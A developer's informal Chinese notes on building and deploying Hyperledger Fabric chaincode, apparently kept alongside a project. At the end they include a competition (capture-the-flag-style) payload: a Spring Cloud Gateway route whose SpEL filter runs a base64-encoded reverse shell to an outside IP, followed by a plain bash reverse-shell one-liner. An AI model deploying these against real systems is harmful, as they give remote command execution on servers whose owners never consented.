# nonsense in project root ~
这里主要是记录一些开发时的中间过程（倒着更新）

## useless repos & links
* [fabric-sdk-go仓库](https://github.com/hyperledger/fabric-sdk-go)是用的传统sdk，对gateway方式来说参考意义不大。
* Fabric[中文文档](https://hyperledger.github.io/)（欸好像不是这个网址），github.io的，不过看着好像没什么用

__done:__
* [x] 每个项目下面都放一个nonsense.md，专门记录废话，README只放关键信息
* [x] 整理项目的markdown，FabApp和chaincode交互时写的markdown乱七八糟
* [x] 去command reference看看peer chaincode invoke和peer chaincode query
* [x] 启动test_network也写成脚本，完善readme的test_network部分
* [x] 先拿atcc的chaincode部署在测试网络上
* [x] 自己写chaincode(atcc)测试，数据用my favorite songs
* [x] 重装fabric-samples
* [x] 重装服务器并恢复开发环境

## misc
让Claude来写这个RSA真是写不清楚啊，无语，不如我上网copy。md，mv指令直接把原来的README给覆盖了，还好GitHub上有备份

根据这个文档[devMod](https://hyperledger-fabric.readthedocs.io/en/release-2.5/peer-chaincode-devmode.html)，按照步骤写了4个shell，放在devModOn目录下，并且把示例代码替换成了自己的chaincode，能开起来，但是init失败，可能是语法问题。在[这里](https://hyperledger-fabric.readthedocs.io/en/release-2.5/commands/peerchaincode.html)这里的一个角落找到了contract-api版本的peer chaincode -c格式，不过好像暂时没啥用？不对啊替换成自己的chaincode了凭什么用原来的peer chaincode invoke能正常工作啊。可能是因为之前go build出来的simpleChaincode没删，后来换成我的之后go build出问题了，没能成功build覆盖原来的。【图片】（哈哈哈哈这里没有图，反正就是InitLedger后QueryRecord成功，阿里云盘有一份备份，时间是2023.5.19）成功了呗！接下来：修改了3.sh，每次都进入我的chaincode目录下go build，之后mv到fabric目录下。可以把1.sh中rm simpleChaincode写到3.sh中，再添加一个功能，用于指定我自己写的chaincode的目录，最后全部推送至Github！

Fabric不同版本的问题：1.4链码安装在peer上，2.0链码容器独立运行。在release-2.5的官方文档写的是：Developers can use the network to test their smart contracts and applications.

官方文档一定要看2.5版本的，版本不一样冲突的太多了




国赛某道题的payload...
{
    "spring": {
        "cloud": {
            "gateway": {
                "routes": [
                    {
                        "id": "exam",
                        "order": 0,
                        "uri": "lb://backendservice",
                        "predicates": [
                            "Path=/echo/**"
                        ],
                        "filters": [
                            {
                                "name": "AddResponseHeader",
                                "args": {
                                    "name": "result",
                                    "value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjY4LjEzMC4yMDkvOTA5OSAwPiYx}|{base64,-d}|{bash,-i}\").getInputStream())).replaceAll('\n','').replaceAll('\r','')}"
                                }
                            }
                        ]
                    }
                ]
            }
        }
    }
}

bash -i >&/dev/tcp/81.68.167.39/5000 0>&1